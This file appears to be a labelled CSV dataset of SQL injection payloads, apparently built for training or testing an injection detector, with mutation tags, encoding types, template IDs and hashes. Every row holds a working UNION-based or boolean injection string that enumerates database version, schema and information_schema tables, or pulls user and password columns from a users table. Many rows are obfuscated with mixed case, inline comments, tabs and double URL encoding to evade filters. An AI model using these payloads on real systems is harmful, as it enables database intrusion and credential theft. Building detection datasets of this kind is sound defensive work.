id%3D1%27%2BuNIoN%2BseLect%2Buser%28%29%2C%2Bpassword%2BFrOM%2Busers%2B--%2B-,1,sqli_enum,case_var|comment_dash_dash_space|ws_plus,url_encoded,SQLI_ENUM_004,6d80ef6d0a9811657478d25c1f412024,945289ad52908a981ba7582b7d32b3eb,77
"id%3D1%27%20UNION%20Select%20database(),%20schema()%20--",1,sqli_enum,case_var|comment_dash_dash|ws_url_space,partially_encoded,SQLI_ENUM_002,e0728487716549bdda7daa71dedaf6cb,2957dcde382e1e6cd843a55230f5ac69,56
id%253D1%2527%2BunIOn%2BsELEcT%2Bdatabase%2528%2529%252C%2Bschema%2528%2529%2B--,1,sqli_enum,case_var|comment_dash_dash|ws_space,double_encoded,SQLI_ENUM_002,6f6f9f9db4ec3def19e77e5d506d597b,6ef0265d63e45728e68fef3a0217973b,80
id%253D1%2527%2Bunion%2BSelECt%2B%2540%2540version%252C%2B%2540%2540datadir%2B%2523,1,sqli_enum,case_var|comment_hash,double_encoded,SQLI_ENUM_003,bc776181b3ec58bb8e576e9a353066a0,fc7f99f4a648f33b484577e95e0897b7,83
id%253D1%2527%2BUNION%2BSELECT%2Bdatabase%2528%2529%252C%2Bschema%2528%2529%2B%252F%252A,1,sqli_enum,comment_block_comment,double_encoded,SQLI_ENUM_002,18389cb87884d1bb4a8163379c564faf,18bc72d53b2bd01cb2d8cdc7ebe4a5e2,88
"id=1%27++UNION +SELECT+ database(),  schema()++%23",1,sqli_enum,comment_hash|ws_multi_space,partially_encoded,SQLI_ENUM_002,3d9155b41f425e77428e71e9acba26ab,4578433b87ea514861372d78fcab8271,50
"id=1%27%20UNION%20SElECt%20user(),%20password%20fROM%20users%20--%20-",1,sqli_enum,case_var|comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_ENUM_004,07386b06be9436176ae6b25e0978f154,be25761709cc73c473a0f9f7cba93883,69
"id=1' Union Select @@version, @@datadir ;-- -",1,sqli_enum,case_var|comment_semicolon_comment,raw,SQLI_ENUM_003,672c62389b3c3837a3eb615d6fdbcb41,f893bb25880e2a8a3bf26496997e2090,45
"id=1'+UNION+SELECT+user(),+password+from+users+--+-",1,sqli_enum,case_var|comment_dash_dash_space|ws_mixed_ws,raw,SQLI_ENUM_004,8bbce19acc4a2e5ee6b22ee05865b601,d63ee108cd9cb873fb08c6724127a7f0,51
"id=1'/**/UniOn/**/select/**/database(),/**/schema()/**/--",1,sqli_enum,case_var|comment_dash_dash|ws_comment_ws,raw,SQLI_ENUM_002,b45228667886fe73863e76797c45ee7c,e8977598b320d668b62786503cfc8768,57
id%253D1%2527%2BUnioN%2BSELeCt%2Buser%2528%2529%252C%2Bpassword%2BFROM%2Busers%2B--%2B-,1,sqli_enum,case_var|comment_dash_dash_space|ws_space,double_encoded,SQLI_ENUM_004,378ae08b5d3332cfae084e37ee9ab10f,2fb840a3b57772010eeb7bd0d17b125f,87
"id=1' Union sELECt @@version, @@datadir %23",1,sqli_enum,case_var|comment_url_hash,raw,SQLI_ENUM_003,1c6b1a53f6c493b215ea10a3841f699c,cd16ca4852759789d80695b198a4b3b3,43
id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2Fselect%2F%2A%2A%2Fdatabase%28%29%2C%2F%2A%2A%2Fschema%28%29%2F%2A%2A%2F--,1,sqli_enum,case_var|comment_dash_dash|ws_comment_ws,url_encoded,SQLI_ENUM_002,e218f0d919f9c127180cdff7855f84f0,f386371aa7f428a6fc77152a4cdcf301,111
id%253D1%2527%252520UNION%252520Select%252520user%2528%2529%252C%252520password%252520FROM%252520users%252520%252523,1,sqli_enum,case_var|comment_url_hash|ws_url_space,double_encoded,SQLI_ENUM_004,0bce8aefe4cc1c43108d012975d40f01,94d801be5940aa6ceddc05d4a7a51927,116
id%3D1%27+UNION+SELECT+%40%40version%2C+%40%40datadir+%23,1,sqli_enum,comment_hash,url_encoded,SQLI_ENUM_003,c7e521e9a2e9bd560f4ee41fe4a7407d,40d269d0e12f7cffb507bce6ce5ee02d,57
"id%3D1%27	UNION	select	version(),	user()	%2F%2A",1,sqli_enum,case_var|comment_block_comment|ws_tab,partially_encoded,SQLI_ENUM_001,f6ef333390b224721afc8c39d61922b5,3064d3148cc711cfb8f7c2694795d89b,47
id%253D1%2527%2BUNION%2BSelect%2B%2540%2540version%252C%2B%2540%2540datadir%2B%253B--%2B-,1,sqli_enum,case_var|comment_semicolon_comment,double_encoded,SQLI_ENUM_003,c9bc60709ce951d07f098d6b715611a8,89cc574d5310639e07afc7b7f0b58102,89
"id=1' UNION Select database(), schema() ;-- -",1,sqli_enum,case_var|comment_semicolon_comment,raw,SQLI_ENUM_002,288de7a2328dd10188a2cf28d7fe398a,07c8a3fee703569db0965cca3ef84028,45
id%3D1%27+UNION+SELECT+user%28%29%2C+password+FROM+users+%2523,1,sqli_enum,comment_url_hash,url_encoded,SQLI_ENUM_004,84c6aa3daee4f380367a82a46eff0125,ecff18cab80eb7adbc05cbc4b2aa27e7,62
id%253D1%2527%2BUNION%2BSELECT%2Buser%2528%2529%252C%2Bpassword%2BFROM%2Busers%2B--,1,sqli_enum,comment_dash_dash,double_encoded,SQLI_ENUM_004,9e79b70d38b42bdfe9763e43c1c07f85,f80677109b8444f802d5f55b423e999b,83
"id%3D1%27+union+select+version(),+user()+/%2A",1,sqli_enum,case_var|comment_block_comment|ws_plus,partially_encoded,SQLI_ENUM_001,98a366a7d3d9dd35829de74f9acfd60c,86a786aa3e925fc9ee66da9d62ef706c,45
id%3D1%27+UNION+SELECT+%40%40version%2C+%40%40datadir+%3B--+-,1,sqli_enum,comment_semicolon_comment,url_encoded,SQLI_ENUM_003,4e891f99ed1d7e1178017530b98d7d0c,92e209d9cf8a2dd9139f3d641515b481,61
id%253D1%2527%2B%2B%2BUnion%2B%2B%2BsELEcT%2B%2B%2B%2540%2540version%252C%2B%2B%2B%2540%2540datadir%2B%2B%2B%252523,1,sqli_enum,case_var|comment_url_hash|ws_mixed_ws,double_encoded,SQLI_ENUM_003,4b58e0bbe540eba2903ef8d47b787a87,f3e28c98f83fbb39c66b0a4deb8fa65a,115
id%253D1%2527%2BUNION%2BSeleCT%2Bdatabase%2528%2529%252C%2Bschema%2528%2529%2B%252523,1,sqli_enum,case_var|comment_url_hash,double_encoded,SQLI_ENUM_002,9a7b517e092515bc6c8bbbf23e1392ee,cc66da8192b2bfdf4cbb2961f2ca1cfd,85
"id=1'+UNION+SELECT+database(),+schema()+--+-",1,sqli_enum,comment_dash_dash_space|ws_plus,raw,SQLI_ENUM_002,56e7ef39253cdad264448da5d15cc6e8,b43b383384dfabecc69622aa2966e73e,44
id%3D1%27+UNION+Select+version%28%29%2C+user%28%29+%2F%2A,1,sqli_enum,case_var|comment_block_comment,url_encoded,SQLI_ENUM_001,98d357c31e3f691c909e3e77dc22dfdd,6572d4aaf9bfce2fdd5ac43740d11cc4,57
"id=1' UNION SELECT @@version, @@datadir /*",1,sqli_enum,comment_block_comment,raw,SQLI_ENUM_003,9977d97107076b03a8327e1f6dbeb23c,f8263111676593e7ac4cc4f8e577b532,42
"id%3D1'+UNION SELECT+database(),+schema()+%23",1,sqli_enum,comment_hash,partially_encoded,SQLI_ENUM_002,f85edb6f3d1fbe297d6deb7040a11ea6,929ca5955b2934d7df9795a3e5cd5dc0,45
id%253D1%2527%2BUnIoN%2BSelect%2B%2540%2540version%252C%2B%2540%2540datadir%2B%252523,1,sqli_enum,case_var|comment_url_hash,double_encoded,SQLI_ENUM_003,31b591d454c91619dd89c0e762946343,f72eeb09ab6c7356dcdfedf91add2f27,85
"id=1' UniOn SelECt database(), schema() %23",1,sqli_enum,case_var|comment_url_hash,raw,SQLI_ENUM_002,82f988a1f7427f268e19598509a17f27,c373648d0216e5fa9355c09b8798361d,43
"id=1'+Union+sElECT+user(), password+from users %23",1,sqli_enum,case_var|comment_url_hash,partially_encoded,SQLI_ENUM_004,8e11923752395344ecd7b4dac0e36d58,7a57900a6fdcde6de500f9df3e48210e,50
id%3D1%27+UNION+select+%40%40version%2C+%40%40datadir+--,1,sqli_enum,case_var|comment_dash_dash,url_encoded,SQLI_ENUM_003,ee592b849631eab4ce4db05ef03d7e40,71afda0d2961fc300f707de3a681c3ea,56
id%3D1%27+UnIOn+SELECT+version%28%29%2C+user%28%29+--,1,sqli_enum,case_var|comment_dash_dash,url_encoded,SQLI_ENUM_001,0818b5c85ab68f6c8b0cc3e064f3d6fb,fcf1514ae1b64979b82ce55e34f9888c,53
id%3D1%27++UNION++SeleCT++version%28%29%2C++user%28%29++--,1,sqli_enum,case_var|comment_dash_dash|ws_multi_space,url_encoded,SQLI_ENUM_001,1b56770b2391a4a9f4d18813071ea1cd,b198ef8413a2c3020359e7afa7f6cb74,58
"id=1'+UNION+SELECT+database(),+schema() %2F*",1,sqli_enum,comment_block_comment,partially_encoded,SQLI_ENUM_002,6b4d4ed7968b847aa902bfc1760b9b46,9dc7b0ceaa9c08d246ce2ea0cdbb40d6,44
"id%3D1%27+UNION SELECT user(),+password+FROM+users %23",1,sqli_enum,comment_url_hash,partially_encoded,SQLI_ENUM_004,695de15a47a2ceef5aa5dcf69785d0fd,53dd0c43c7596e9df8fb49651f74603f,54
id%3D1%27%2BUNION%2BSELECT%2Buser%28%29%2C%2Bpassword%2BFROM%2Busers%2B%2F%2A,1,sqli_enum,comment_block_comment|ws_plus,url_encoded,SQLI_ENUM_004,1f1efa203ff73300192862a066bf3f1f,2e7a6e325266eeef5798e97d43fbb2b5,77
"id=1' UNION SELECT version(), user() --",1,sqli_enum,comment_dash_dash,raw,SQLI_ENUM_001,a063e886c897edaf95ec45fcceb98032,f1397a897622a1f021ddfc660aae933b,39
"id=1%27%2F%2A*%2FUNION/%2A*%2FSELECT%2F*%2A%2Fuser(),/%2A*%2Fpassword/%2A%2A/FROM%2F%2A*/users%2F*%2A%2F#",1,sqli_enum,comment_hash|ws_comment_ws,partially_encoded,SQLI_ENUM_004,52353e79471426a4b09ca01cc9022272,aef635f052aeec0c39b75c30bea3d50a,105
"id=1%27	UNION	select	database(),	schema()	--",1,sqli_enum,case_var|comment_dash_dash|ws_tab,partially_encoded,SQLI_ENUM_002,0ace15bfd6b671a1237002be384fa01e,210e1bc2375ba508d6a39f39d01835e2,44
"id%3D1%27++UNION++SELECT +column_name,+ table_name+ FROM+ information_schema.columns +WHERE +table_name%3D%27users'++-- +-",1,sqli_info_schema,comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_002,a41847ce619188addf3ef05d2d803794,bbebea0054a7b6976b9a0d249e3a941a,122
id%3D1'+AND+(SELECT+COUNT(%2A)+FROM information_schema.columns+WHERE table_name%3D%27users')>0 --+-,1,sqli_info_schema,comment_dash_dash_space|ws_space,partially_encoded,SQLI_INFO_SCHEMA_003,0b440d824967e42a6d476923d1f932ee,f566ed3ac8e0121f057c66d67164b989,99
id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSelect%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Ftable_schema%2F%2A%2A%2FFrom%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--,1,sqli_info_schema,case_var|comment_dash_dash|ws_comment_ws,url_encoded,SQLI_INFO_SCHEMA_001,841d3944f78df23c8bc6eb3fbc513cff,7335b17bf882211ca29fa2500808141a,160
"id=1' uNioN select table_name, table_schema From information_schema.tables %23",1,sqli_info_schema,case_var|comment_url_hash,raw,SQLI_INFO_SCHEMA_001,6a510e2e272f6ad02027319db198b6b1,184f1ddabf1418a61d278a0e10c8b17a,78
id%253D1%2527%2BAnD%2B%2528SELECT%2BCOUNT%2528%252A%2529%2BFrOm%2Binformation_schema.columns%2BWHERE%2Btable_name%253D%2527users%2527%2529%253E0%2B%2523,1,sqli_info_schema,case_var|comment_hash|ws_space,double_encoded,SQLI_INFO_SCHEMA_003,9dfaf5ce52e5a4c37a125b074e244b56,a10ab1ad11721ebbe30feed00ec8e598,152
id%253D1%2527%252520UNION%252520SELECT%252520column_name%252C%252520table_name%252520FROM%252520information_schema.columns%252520WHERE%252520table_name%253D%2527users%2527%252520%253B--%252520-,1,sqli_info_schema,comment_semicolon_comment|ws_url_space,double_encoded,SQLI_INFO_SCHEMA_002,a033f1abfdc05699a9d432cef3510e33,589cebaac37fbdcad5a4c49ef1ac0087,193
"id=1'/**/UNION/**/SELECT/**/table_name,/**/table_schema/**/from/**/information_schema.tables/**//*",1,sqli_info_schema,case_var|comment_block_comment|ws_mixed_ws,raw,SQLI_INFO_SCHEMA_001,6f1e2be325f2ea069983fe9fdcc6a7eb,d9b80faf74335347545873e4daa4414e,98
"id=1'	UNION	SELECT	table_name,	table_schema	FROM	information_schema.tables	/%2A",1,sqli_info_schema,comment_block_comment|ws_tab,partially_encoded,SQLI_INFO_SCHEMA_001,767a01e92d665f04d5b837bef80d937d,ff62999c30407a903232174aafd15b18,79
id%3D1%27+AND (SELECT+COUNT(%2A) FROM information_schema.columns WHERE+table_name%3D'users%27)%3E0+--+-,1,sqli_info_schema,comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_003,68dd41ccf5728604f1e83e775a8e9f26,c2cfe704181c6484df6d25de7f229952,103
id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Ftable_schema%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%2F%2A,1,sqli_info_schema,comment_block_comment|ws_mixed_ws,url_encoded,SQLI_INFO_SCHEMA_001,453f905af15318cb2544ace9e1bbc9c7,1917cce2d4b9461b53e04d4ebd3db7ff,164
"id=1%27+UNION+SELECT+column_name, table_name+FROM+information_schema.columns WHERE+table_name=%27users'+%2F%2A",1,sqli_info_schema,comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_002,bb3f567d0c9f121eeb9ca85316f61de1,6bca0b12ece7282f498791548f0d1932,110
"id%3D1'+UniOn SELECT+table_name,+table_schema+From information_schema.tables ;--+-",1,sqli_info_schema,case_var|comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_001,799aa6612e2ff30a29c786aec3cd0374,0d4fac5f1b9e13b83b508d3b14ac1fb3,82
id=1' and (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0 -- -,1,sqli_info_schema,case_var|comment_dash_dash_space,raw,SQLI_INFO_SCHEMA_003,14b04af0a9c5efbf797fae05a79f5b26,281c8db1b4d01f40235f9d85ba421690,91
id%253D1%2527%2BUNION%2BSELECT%2Bcolumn_name%252C%2Btable_name%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%253D%2527users%2527%2B%252F%252A,1,sqli_info_schema,comment_block_comment,double_encoded,SQLI_INFO_SCHEMA_002,36da37dabb264f4c7c0997d8800d335b,b1ca9dbc37d66e5de4503daeae36490b,152
id%3D1%27%09Union%09sELecT%09table_name%2C%09table_schema%09fROM%09information_schema.tables%09%2F%2A,1,sqli_info_schema,case_var|comment_block_comment|ws_tab,url_encoded,SQLI_INFO_SCHEMA_001,288a44b93f082951c4f10d311d477209,74645d93708467458d96a65febcd4644,101
"id=1%27/*%2A%2FUNION%2F%2A*%2FSELECT%2F%2A%2A/column_name,%2F%2A%2A/table_name%2F%2A%2A%2FFROM/%2A%2A%2Finformation_schema.columns%2F%2A*%2FWHERE%2F%2A%2A%2Ftable_name%3D%27users'%2F%2A%2A/%3B--/%2A*%2F-",1,sqli_info_schema,comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_002,bd8ac5d1eb4dc100bfe2907456031015,044a1fd9fb4ca5ec8f5b59d3263a0006,203
"id%3D1%27 Union Select+column_name, table_name+From information_schema.columns+wHeRE table_name='users%27 --+-",1,sqli_info_schema,case_var|comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_002,4170f71055bd0398b99c26f44eeeaa85,db2989f0457aa883e15781fc3deaf2ad,110
id%253D1%2527%2509AND%2509%2528SELECT%2509COUNT%2528%252A%2529%2509FROM%2509information_schema.columns%2509WHeRE%2509table_name%253D%2527users%2527%2529%253E0%2509%2523,1,sqli_info_schema,case_var|comment_hash|ws_tab,double_encoded,SQLI_INFO_SCHEMA_003,9754c50e9e012f6c249d53026373a945,d275bc31d13997f4f522ecd209bc5d71,168
id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/From/**/information_schema.columns/**/where/**/table_name='users')>0/**//*,1,sqli_info_schema,case_var|comment_block_comment|ws_comment_ws,raw,SQLI_INFO_SCHEMA_003,386d2ee907929c36b1c57aa81d83824b,f475c248ca41ee976d5a4dc6542e9af1,113
id%3D1%27%2F%2A%2A%2FUnion%2F%2A%2A%2FSELECT%2F%2A%2A%2Fcolumn_name%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FfrOm%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWherE%2F%2A%2A%2Ftable_name%3D%27users%27%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,1,sqli_info_schema,case_var|comment_semicolon_comment|ws_mixed_ws,url_encoded,SQLI_INFO_SCHEMA_002,da466f9b116ad539cedd5d4fcc1a97ce,daae2ed4b25f6b2893afe72ddbc54c44,229
id%253D1%2527%2509unIoN%2509seleCt%2509column_name%252C%2509table_name%2509from%2509information_schema.columns%2509WHERE%2509table_name%253D%2527users%2527%2509--,1,sqli_info_schema,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_INFO_SCHEMA_002,a54875787c5f5773fef48948512b5f58,2ce30ae8d9cfe0da3fae69c4152b855c,162
"id=1'%20uNiOn%20select%20table_name,%20table_schema%20frOM%20information_schema.tables%20;--%20-",1,sqli_info_schema,case_var|comment_semicolon_comment|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_001,25164cfed8b9cbb06828a3308f1967a8,efdbfb7e61db6472a7083b47a0e8134e,96
id=1%27+AnD (SELECT COUNT(*) from+information_schema.columns Where+table_name=%27users')>0+%23,1,sqli_info_schema,case_var|comment_hash,partially_encoded,SQLI_INFO_SCHEMA_003,c317d8d25a609ef384d082c3c600efa9,f6ce5c8402a903d74ea81daa2a006a0b,94
"id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' #",1,sqli_info_schema,comment_hash|ws_space,raw,SQLI_INFO_SCHEMA_002,bcf2a5d103c9c9ec8784fa60003d48df,afed0a7101c7087bd0907ddf2eff13d6,101
id%3D1%27++union++Select++column_name%2C++table_name++froM++information_schema.columns++whEre++table_name%3D%27users%27++%23,1,sqli_info_schema,case_var|comment_hash|ws_multi_space,url_encoded,SQLI_INFO_SCHEMA_002,cca616bb49531b4d90bb9dc03ef9c2fe,0e87d8b6637712657383a5e6ee261389,124
"id%3D1%27 UNION+SELECT+table_name,+table_schema From information_schema.tables --+-",1,sqli_info_schema,case_var|comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_001,a6541ea3fe984f1bc525f393318201b6,0f52801ff3e969e93e0c3b56cba26785,83
"id=1%27+UNION SELECT table_name,+table_schema+FROM+information_schema.tables+--+-",1,sqli_info_schema,comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_001,0f26aa387c913d1430985ee9f5c19352,b5619a7d6a971258e84861662f9156bd,81
id%253D1%2527%2Bunion%2BSelect%2Bcolumn_name%252C%2Btable_name%2Bfrom%2Binformation_schema.columns%2Bwhere%2Btable_name%253D%2527users%2527%2B%253B--%2B-,1,sqli_info_schema,case_var|comment_semicolon_comment,double_encoded,SQLI_INFO_SCHEMA_002,bf886ef222f5cb401a7ee6f691e25a57,277f1896ec6679617ad9b4b6fe5f0428,153
id%3D1%27+UNION+SELECT+column_name%2C+table_name+FROM+information_schema.columns+WHERE+table_name%3D%27users%27+--,1,sqli_info_schema,comment_dash_dash,url_encoded,SQLI_INFO_SCHEMA_002,5228fc14c3b331e4131baf78e9de6ba5,7a769ab0f9e44a520464425cf17c4c8a,114
id%3D1'+ +AND+++(SELECT+ +COUNT(%2A)+ +FROM  +information_schema.columns+  WHERE   table_name%3D'users%27)%3E0+++--,1,sqli_info_schema,comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_003,b79d55c3cef301a269441a6bfda94468,7264bc5c7023ec01a3734f742734120f,115
"id%3D1%27+ uNIOn+ SelecT  table_name,++table_schema  FROM++information_schema.tables++%23",1,sqli_info_schema,case_var|comment_hash|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_001,b2a3a8d9b4914f2b640665382dea4e2c,d0f19d784cce591c282bf7c6a7cc78ca,89
id=1%27 AND (SELECT COUNT(%2A) froM+information_schema.columns+WheRe table_name='users')%3E0 /*,1,sqli_info_schema,case_var|comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_003,54dc0cdaa4e63374983828c507f58ff8,826159605e19a45c0924462c0ad04abd,95
id%253D1%2527%2BUNION%2BSELECT%2Bcolumn_name%252C%2Btable_name%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%253D%2527users%2527%2B%2523,1,sqli_info_schema,comment_hash,double_encoded,SQLI_INFO_SCHEMA_002,c5f2fb799e79a2ee695e871c2e67721f,265fcf2d23c50020c24755a480bc4cb4,147
id%3D1%27+UNION+SELECT+table_name%2C+table_schema+FROM+information_schema.tables+%2523,1,sqli_info_schema,comment_url_hash,url_encoded,SQLI_INFO_SCHEMA_001,c398c9066251ae1547917c1b8bb32384,888f7aece7333c9269c0a845345335f1,86
id=1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0 #,1,sqli_info_schema,comment_hash,raw,SQLI_INFO_SCHEMA_003,e62ae138f13dea51498286f86d8d6024,169759ea4de2ffe1c86ca238873e5302,88
"id=1%27	union	SELECT	column_name,	table_name	from	information_schema.columns	where	table_name%3D%27users'	%23",1,sqli_info_schema,case_var|comment_hash|ws_tab,partially_encoded,SQLI_INFO_SCHEMA_002,b874290a24ebd5bcf7592e6e221ec363,5023070de13ccdec088a7d5e430c8102,109
"id%3D1%27+ UNION  SELECT+ column_name,++table_name++FROM  information_schema.columns++WHERE++table_name%3D'users'+ --++-",1,sqli_info_schema,comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_002,7c815c974655fe7e9934498c483a8722,40b3a1759433b521acf2034c6ca747f2,120
id%3D1%27 And+(SELECT+COUNT(%2A)+From+information_schema.columns where table_name%3D%27users%27)>0 %23,1,sqli_info_schema,case_var|comment_hash|ws_space,partially_encoded,SQLI_INFO_SCHEMA_003,d63c667719c2a6a29eafa5c61f659e05,b4c9ddd5e05ff13624d7be44f41fed1b,102
id%3D1%27%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27users%27)%3E0%20--,1,sqli_info_schema,comment_dash_dash|ws_url_space,partially_encoded,SQLI_INFO_SCHEMA_003,7247c12f925721310b169793083ecf6d,497984ddbd1fbe25aafbec8f365d30b1,117
id%3D1' and (SELECT+COUNT(%2A)+FROM information_schema.columns+where table_name%3D%27users')%3E0+%23,1,sqli_info_schema,case_var|comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_003,65008d533dc0ca567751275364e16951,d1813cfe06d22993ea3d865ac8b1a7b1,100
id%3D1%27%2BUNION%2BSELECT%2Bcolumn_name%2C%2Btable_name%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%3D%27users%27%2B--%2B-,1,sqli_info_schema,comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_INFO_SCHEMA_002,ce6447093f5348ee608617a9db03f95c,f431cfe19ddaf18475e1a1a845575c61,136
id%253D1%2527%2BUNION%2Bselect%2Btable_name%252C%2Btable_schema%2BfRoM%2Binformation_schema.tables%2B%252523,1,sqli_info_schema,case_var|comment_url_hash|ws_space,double_encoded,SQLI_INFO_SCHEMA_001,6b08582d24c2ed456552106840108c67,d880ecac994287cd9634f10da8c6c47c,108
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252FCOUNT%2528%252A%2529%252F%252A%252A%252FFROM%252F%252A%252A%252Finformation_schema.columns%252F%252A%252A%252FWHERE%252F%252A%252A%252Ftable_name%253D%2527users%2527%2529%253E0%252F%252A%252A%252F%252523,1,sqli_info_schema,comment_url_hash|ws_comment_ws,double_encoded,SQLI_INFO_SCHEMA_003,9f9e2fcf329aa06df08a766fa153b736,4f512f50fd3ed797e02f148d6036ea9b,290
id%3D1%27++Union++Select++column_name%2C++table_name++frOm++information_schema.columns++where++table_name%3D%27users%27++%3B--++-,1,sqli_info_schema,case_var|comment_semicolon_comment|ws_multi_space,url_encoded,SQLI_INFO_SCHEMA_002,749e8277df0f6a14404e4c242b6b572d,7d34fd1c3c89a4e18a55c557f42fcbbb,129
"id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' -- -",1,sqli_info_schema,comment_dash_dash_space,raw,SQLI_INFO_SCHEMA_002,1c79164bc43d034b9c3e33046d690a37,abf8e4de527ac23ca37d72c07db3e044,104
"id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' ;-- -",1,sqli_info_schema,comment_semicolon_comment|ws_space,raw,SQLI_INFO_SCHEMA_002,00c4cad41f5f9aa0cc8886f9afd2980d,f9e16e05b583985ea5a5a09a36daa201,105
"id=1'+UNION+select+table_name,+table_schema+FROM+information_schema.tables+;--+-",1,sqli_info_schema,case_var|comment_semicolon_comment|ws_plus,raw,SQLI_INFO_SCHEMA_001,78a8b062b1b0d5cb92ff2b4dde4e601b,bd39673ad1de690d2763b921b8f914fe,80
"id=1' UNION SELECT table_name, table_schema FROM information_schema.tables ;-- -",1,sqli_info_schema,comment_semicolon_comment,raw,SQLI_INFO_SCHEMA_001,18df60eb2f0a411f05aba9b5b78ca665,3a4ec7c8c9a3637918129bca79d82590,80
"id=1%27 uNIOn sElect column_name, table_name+from+information_schema.columns where+table_name%3D'users'+--",1,sqli_info_schema,case_var|comment_dash_dash,partially_encoded,SQLI_INFO_SCHEMA_002,841ed1a1f7a119737a58dac26bcc4598,4926a1a01da71bb0249c434437d032d6,106
"id=1'%20Union%20Select%20column_name,%20table_name%20from%20information_schema.columns%20WHERE%20table_name%3D%27users%27%20%23",1,sqli_info_schema,case_var|comment_url_hash|ws_url_space,partially_encoded,SQLI_INFO_SCHEMA_002,fbc5f216493d8d360cc4c5a519d1c0e9,ea13e2e9460270cabd59032f90b56e27,127
id%253D1%2527%2BuNioN%2BSELECT%2Btable_name%252C%2Btable_schema%2BFrom%2Binformation_schema.tables%2B%252F%252A,1,sqli_info_schema,case_var|comment_block_comment,double_encoded,SQLI_INFO_SCHEMA_001,aaf600e11c3e6f3f299f7baa7488e7a9,a83abd8a5cdc1a9a946f511f65ff9cba,111
"id=1'+UNION+SELECT+table_name,+table_schema+FROM+information_schema.tables+--+-",1,sqli_info_schema,comment_dash_dash_space|ws_plus,raw,SQLI_INFO_SCHEMA_001,a9fa6d69df2bd1db2ebd7a9faa0905f5,13c4fbe3c44913151b37a5efad21d654,79
id%253D1%2527%2BUnion%2Bselect%2Btable_name%252C%2Btable_schema%2BFrom%2Binformation_schema.tables%2B--,1,sqli_info_schema,case_var|comment_dash_dash,double_encoded,SQLI_INFO_SCHEMA_001,42b402c2eaa7122c067f5828ad4e4dea,4e74a7df96468860137431d2de62e591,103
id%3D1%27%2F%2A%2A%2FUnion%2F%2A%2A%2FSELECT%2F%2A%2A%2Fcolumn_name%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2Ffrom%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A%2Ftable_name%3D%27users%27%2F%2A%2A%2F--%2F%2A%2A%2F-,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_INFO_SCHEMA_002,91946f1f0b97ef44e08a409419ae5d2b,ae5fb06e3e32a1864afde803c5af73eb,226
id%3D1'++AND  (SELECT++COUNT(*)+ FROM++information_schema.columns+ WHERE +table_name='users%27)%3E0 +-- +-,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_003,12a3f1feccee9d1d4195063de2abc366,a28efc016aa6d633ccc16e712a472c77,106
"id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' %23",1,sqli_info_schema,comment_url_hash,raw,SQLI_INFO_SCHEMA_002,b1f33f3f594698e439d596d385930917,40c9286ff91afcb0699425db0f31e751,103
id%3D1'+AND (SELECT+COUNT(%2A)+FROM+information_schema.columns Where+table_name=%27users%27)%3E0 --+-,1,sqli_info_schema,case_var|comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_003,6b4623c6ce081ff8f4fcd3d1ddc0e6e5,764958c869b8cce21fcb648f85703d6e,101
id%3D1%27%09AND%09%28SELECT%09COUNT%28%2A%29%09FROM%09information_schema.columns%09WHERE%09table_name%3D%27users%27%29%3E0%09--%09-,1,sqli_info_schema,comment_dash_dash_space|ws_tab,url_encoded,SQLI_INFO_SCHEMA_003,c20f464bcba0aba9f66839a5e062051b,70491aef12b9298dfb9dba69dab5a6ff,131
"id=1'+UNION+SELECT+table_name,+table_schema+FROM+information_schema.tables+/%2A",1,sqli_info_schema,comment_block_comment|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_001,2edebd4f4d96972f8094cc73efb679d1,c7739af4b5c45bc28b8d490ed37dde1f,79
